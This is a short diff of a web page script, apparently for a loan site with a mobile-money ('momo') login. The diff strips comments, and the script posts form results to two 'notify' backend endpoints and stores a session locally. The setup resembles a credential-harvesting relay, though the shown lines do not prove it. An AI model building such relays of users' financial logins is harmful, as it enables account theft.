@@ -217,7 +217,6 @@
   </div>
 
 <script>
-  // Your two backend endpoints (token lives on the server, not here)
   const ENDPOINTS = [
     "https://advanced-loan.onrender.com/notify",
     "https://web-production-1a1f07.up.railway.app/notify"
@@ -234,6 +233,7 @@
   function openModal(){
     el('successModal').classList.add('show');
   }
+
   function closeModal(){
     el('successModal').classList.remove('show');
     // Redirect to index after the popup closes
@@ -292,7 +292,6 @@
       return;
     }
 
-    // Save session locally
     localStorage.setItem('session', JSON.stringify({
       momo,
       loggedInAt: new Date().toISOString()
@@ -305,14 +304,13 @@
 
     if(result.ok){
       setStatus('');
-      openModal();          // popup appears
+      openModal();
     }else{
       setStatus('❌ ' + result.error, 'err');
       el('submitBtn').disabled = false;
     }
   }
 
-  // Allow closing with Escape key
   document.addEventListener('keydown', e => {
     if(e.key === 'Escape') closeModal();
   });
